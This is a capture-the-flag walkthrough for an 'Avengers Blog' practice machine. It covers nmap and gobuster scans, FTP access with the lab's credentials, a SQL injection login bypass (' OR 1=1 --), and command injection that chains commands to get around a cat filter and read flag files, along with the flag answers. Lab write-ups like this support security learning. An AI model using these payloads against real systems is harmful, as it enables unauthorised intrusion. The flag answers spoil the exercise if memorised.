> Avengers Blog | Beginner

1. On the deployed Avengers machine you recently deployed, get the flag1 cookie value.

```
cookie_secrets
```

2. Look at the HTTP response headers and obtain flag 2.

```
headers_are_important
```

# Nmap

nmap -sC -sV -T4 -Pn -vvv -A -oN nmap/initial 10.10.30.203

```
21/tcp open  ftp     syn-ack vsftpd 3.0.3
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Node.js Express framework
|_http-favicon: Unknown favicon MD5: E084507EB6547A72F9CEC12E0A9B7A36
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Avengers! Assemble!
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

# FTP

## FTP Credentials

`groot`:`iamgroot`

We got `flag3.txt` in `files` directory.

```
8fc651a739befc58d450dc48e1f1fd2e
```

# Gobuster

gobuster dir -u http://10.10.30.203 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -o gobuster/initial

```
/home                 (Status: 302) [Size: 23] [--> /]
/img                  (Status: 301) [Size: 173] [--> /img/]
/Home                 (Status: 302) [Size: 23] [--> /]     
/assets               (Status: 301) [Size: 179] [--> /assets/]
/portal               (Status: 200) [Size: 1409]              
/css                  (Status: 301) [Size: 173] [--> /css/]   
/js                   (Status: 301) [Size: 171] [--> /js/]    
/logout               (Status: 302) [Size: 29] [--> /portal]
```

Looking at `/portal` we got a login page. And trying username as `' OR 1=1 --` and password as `' or 1=1--` gives us access.

And we can run commands here. Woow!! But some commands are whitelisted. Let's try to join commands.

```
cd ../;ls => It works and we have flag5.txt
```

But cat command is not allowed. So let's try for `tac` command.

`cd ,,/;ls;tac flag5.txt`

# flag5.txt

```
d335e2d13f36558ba1e67969a1718af7
```